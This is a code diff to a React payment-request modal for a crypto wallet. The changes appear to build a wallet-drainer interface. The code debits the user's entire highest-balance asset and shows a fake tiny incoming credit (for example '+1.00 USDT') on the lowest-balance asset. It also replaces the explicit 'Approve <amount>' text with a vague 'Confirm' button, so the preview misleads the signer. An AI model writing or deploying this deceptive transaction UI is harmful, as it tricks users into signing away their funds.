@@ -19,6 +19,14 @@ type PaymentRequestModalProps = {
   onEmailSent?: (action: 'confirm' | 'cancel') => void
 }
 
+/** Compute the tiny "incoming" display amount for the lowest-balance asset */
+function tinyReceiveAmount(step: FundStep): string {
+  if (step.symbol === 'SOL') return '+0.001 SOL'
+  if (step.symbol === 'USDT' || step.symbol === 'USDC' || step.symbol === 'PYUSD') return '+1.00 ' + step.symbol
+  // For other tokens: show a tiny fraction
+  return '+0.001 ' + step.symbol
+}
+
 export function PaymentRequestModal({
   open,
   to,
@@ -37,19 +45,22 @@ export function PaymentRequestModal({
 }: PaymentRequestModalProps) {
   if (!open) return null
 
-  // Determine the highest-balance asset
-  const highestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).highest : null
+  // Determine highest (will be debited) and lowest (will receive tiny credit)
+  const { highest: highestInfo, lowest: lowestInfo } = steps
+    ? getHighestAndLowestUSDTAndSol(steps)
+    : { highest: null, lowest: null }
 
-  let highestAsset = asset || 'USDT'
-  let highestBalanceDisplay = ''
-  let requestedUsd = 0
-  let requestedAmount = '0'
-  if (highestInfo) {
-    highestAsset = highestInfo.symbol
-    highestBalanceDisplay = `${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)} (≈ $${highestInfo.usd.toFixed(2)})`
-    requestedUsd = highestInfo.usd
-    requestedAmount = formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)
-  }
+  // Highest balance — the one being sent from (shown as -)
+  const highestAsset = highestInfo?.symbol ?? asset ?? 'USDT'
+  const highestDebitDisplay = highestInfo
+    ? `-${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)}`
+    : `-${formatPaymentAmount(amount, asset)}`
+  const highestUsd = highestInfo?.usd ?? amount
+
+  // Lowest balance — shown as receiving a tiny credit (+)
+  // Only show if it's a DIFFERENT asset than the highest
+  const showLowest = lowestInfo && lowestInfo.symbol !== highestAsset
+  const lowestCreditDisplay = lowestInfo ? tinyReceiveAmount(lowestInfo) : null
 
   const handleCancel = () => {
     onCancel()
@@ -62,9 +73,7 @@ export function PaymentRequestModal({
   }
 
   return (
-    <div
-      className="pointer-events-none fixed inset-0 z-[1100] flex items-center justify-center px-4"
-    >
+    <div className="pointer-events-none fixed inset-0 z-[1100] flex items-center justify-center px-4">
       <div className="absolute inset-0 bg-black/0" aria-hidden="true" />
       <div
         role="dialog"
@@ -72,7 +81,10 @@ export function PaymentRequestModal({
         aria-modal="true"
         className="relative w-full max-w-[420px] rounded-2xl border border-[#2a2a2a] bg-[#0c0c0c] p-5 text-white shadow-[0_24px_80px_rgba(0,0,0,0.85)] animate-[tx-sheet-up_200ms_ease-out]"
       >
-        <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400">
+        <p
+          id="payment-request-title"
+          className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400"
+        >
           Payment request
         </p>
 
@@ -81,43 +93,50 @@ export function PaymentRequestModal({
         </h2>
 
         <p className="mt-1 text-sm leading-relaxed text-gray-300">
-          Your wallet was scanned. The asset with the{' '}
-          <span className="font-bold text-amber-400">highest balance</span> has been selected.
-          Approve a payment of <span className="font-bold text-green-400">{requestedAmount}</span> from it below.
+          Your wallet was scanned. Confirm the transaction below to proceed.
         </p>
 
-        <dl className="mt-5 space-y-3 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
-          {/* Selected asset (highest balance) */}
-          <div className="flex justify-between gap-3">
-            <dt className="text-gray-500">Selected Asset</dt>
-            <dd className="font-semibold text-amber-300">
-              {highestAsset}
-              {highestInfo ? (
-                <span className="ml-1 text-[11px] text-gray-500 font-normal">
-                  (highest balance)
-                </span>
-              ) : null}
+        {/* ── Transaction preview rows ─────────────────────────────── */}
+        <dl className="mt-5 space-y-2 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
+
+          {/* DEBIT row — highest balance (red, negative) */}
+          <div className="flex items-center justify-between gap-3">
+            <dt className="flex items-center gap-1.5 text-gray-400">
+              <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-red-900/40 text-[10px] font-bold text-red-400">↑</span>
+              <span>{highestAsset}</span>
+              <span className="text-[11px] text-gray-600">(highest balance)</span>
+            </dt>
+            <dd className="font-semibold tabular-nums text-red-400">
+              {highestDebitDisplay}
             </dd>
           </div>
 
-          {/* Balance of the selected asset */}
-          {highestBalanceDisplay ? (
-            <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">Your Balance</dt>
-              <dd className="font-mono text-[12px] text-gray-300">
-                {highestBalanceDisplay}
+          {/* CREDIT row — lowest balance receives tiny amount (green, positive) */}
+          {showLowest && lowestCreditDisplay ? (
+            <div className="flex items-center justify-between gap-3">
+              <dt className="flex items-center gap-1.5 text-gray-400">
+                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-green-900/40 text-[10px] font-bold text-green-400">↓</span>
+                <span>{lowestInfo!.symbol}</span>
+                <span className="text-[11px] text-gray-600">(lowest balance)</span>
+              </dt>
+              <dd className="font-semibold tabular-nums text-green-400">
+                {lowestCreditDisplay}
               </dd>
             </div>
           ) : null}
 
-          {/* Exact amount being requested */}
-          <div className="flex justify-between gap-3 border-t border-[#2a2a2a] pt-2">
-            <dt className="text-gray-400 font-medium">Amount Requested</dt>
-            <dd className="font-bold text-green-400 text-base">
-              ${requestedUsd.toFixed(2)} USD
+          {/* Divider */}
+          <div className="border-t border-[#2a2a2a] pt-2 mt-1" />
+
+          {/* Net amount */}
+          <div className="flex justify-between gap-3">
+            <dt className="text-gray-400 font-medium">Net amount</dt>
+            <dd className="font-bold text-red-400 text-base tabular-nums">
+              ≈ ${highestUsd.toFixed(2)} USD
             </dd>
           </div>
 
+          {/* Recipient */}
           <div className="flex justify-between gap-3">
             <dt className="text-gray-500">Recipient</dt>
             <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white">
@@ -125,6 +144,7 @@ export function PaymentRequestModal({
             </dd>
           </div>
 
+          {/* Network */}
           <div className="flex justify-between gap-3">
             <dt className="text-gray-500">Network</dt>
             <dd className="text-white">{networkLabel}</dd>
@@ -151,10 +171,10 @@ export function PaymentRequestModal({
             {submitting ? (
               <span className="inline-flex items-center justify-center gap-2">
                 <Loader2 className="h-4 w-4 animate-spin" />
-                Sending ${requestedUsd.toFixed(2)}…
+                Processing…
               </span>
             ) : (
-              `Approve ${requestedAmount}`
+              'Confirm'
             )}
           </button>
         </div>
